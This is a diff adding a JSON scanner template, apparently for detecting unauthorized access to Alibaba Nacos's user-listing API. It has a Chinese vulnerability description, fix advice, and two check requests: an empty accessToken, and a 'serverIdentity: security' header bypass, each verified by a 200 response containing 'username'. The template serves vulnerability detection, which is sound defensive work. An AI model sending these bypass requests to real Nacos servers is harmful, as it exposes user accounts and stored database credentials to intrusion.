@@ -1,0 +1,58 @@
+{
+  "product": "Alibaba Nacos",
+  "vul_name": "Nacos (v1/auth/users) 未授权访问",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "Nacos 是 SpringCloud Alibaba 微服务架构中的一个组件，主要作用是服务注册和发现以及分布式配置管理，通常情况下 Nacos 中存储着 MySQL、Redis 等数据库的账号和密码。当前使用的版本存在用户读取、添加、登陆的漏洞。通过版本漏洞，攻击者可以在不登陆系统的情况下读取已存在的用户或者添加用户，进而登陆系统，登陆系统后可获取大量配置信息以发起进一步攻击。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/yinansheng1/article/details/135752707",
+  "fix": [
+    "检查 Nacos 服务端是否开启了身份验证。如果开启了，确保客户端在请求时提供了正确的认证信息，比如用户名和密码。",
+    "如果使用了角色基于角色的访问控制（RBAC），确保客户端使用的账号具有足够的权限去访问指定的接口或资源。",
+    "检查 Nacos 的配置文件（比如 application.properties 或 nacos.conf），确认是否正确配置了安全认证的相关参数。",
+    "如果是第三方系统或服务在访问 Nacos，确保该系统或服务的访问令牌（Token）是有效的，并且已经被授权访问 Nacos 的相关资源。",
+    "查看 Nacos 服务端的日志文件，以获取更多关于未授权访问的详细信息，并根据日志中的错误提示进行调整。"
+  ],
+  "logic": "or",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken="
+      },
+      "verify": {
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "username"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "header": {
+          "serverIdentity": "security"
+        },
+        "path": "/nacos/v1/auth/users?pageNo=1&pageSize=9"
+      },
+      "verify": {
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "username"
+          }
+        ]
+      }
+    }
+  ]
+}
